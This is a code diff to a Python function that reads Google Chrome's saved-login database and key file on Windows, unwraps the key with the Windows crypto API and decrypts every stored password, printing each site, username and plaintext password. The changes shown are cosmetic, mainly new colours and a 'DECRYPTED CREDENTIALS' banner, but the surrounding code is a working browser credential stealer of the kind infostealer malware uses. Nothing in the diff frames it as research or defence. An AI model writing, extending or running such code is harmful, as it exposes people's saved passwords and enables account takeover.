@@ -4,7 +4,7 @@ import json
 import base64
 import win32crypt
 from Crypto.Cipher import AES
-from utils.ansiColors import RED, RESET
+from utils.ansiColors import BOLD_RED, BOLD_GREEN, GRAY, RESET
 
 def getPasswords():
     try:
@@ -15,7 +15,7 @@ def getPasswords():
         keyPath = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Local State"
 
         if not os.path.exists(dbPath) or not os.path.exists(keyPath):
-            print(f"{RED}'Login Data' or 'Local State' file not found.{RESET}")
+            print(f"{BOLD_RED}'Login Data' or 'Local State' file not found.{RESET}")
             return
 
         with open(keyPath, 'r') as file:
@@ -27,6 +27,12 @@ def getPasswords():
         cursor = conn.cursor()
         cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
 
+        print("=====================================")
+        print("      ** DECRYPTED CREDENTIALS **    ")
+        print("=====================================")
+
+        outputs = []
+
         for originUrl, username, encryptedPassword in cursor.fetchall():
             if not username or not encryptedPassword:
                 continue
@@ -36,12 +42,18 @@ def getPasswords():
                 cipher = AES.new(decryptedKey, AES.MODE_GCM, iv)
                 decryptedPassword = cipher.decrypt(encryptedPassword[15:-16]).decode()
 
-                print(f"Main URL: {originUrl}")
-                print(f"User name: {username}")
-                print(f"Decrypted Password: {decryptedPassword}\n")
+                outputs.append(f"{BOLD_GREEN}► {GRAY}{originUrl}")
+                outputs.append(f"{BOLD_GREEN}Username :{RESET} {username}")
+                outputs.append(f"{BOLD_GREEN}Password :{RESET} {decryptedPassword}")
+                outputs.append("")
+            
             except Exception as e:
-                print(f"{RED}Error decrypting password for {originUrl}: {e}{RESET}")
+                outputs.append(f"{BOLD_RED}Error decrypting password for {originUrl}: {e}{RESET}")
+
+        for line in outputs[:-1]:
+            print(line)
+        print("=====================================")
 
         conn.close()
     except Exception as e:
-        print(f"{RED}General error: {e}{RESET}")
+        print(f"{BOLD_RED}General error: {e}{RESET}")
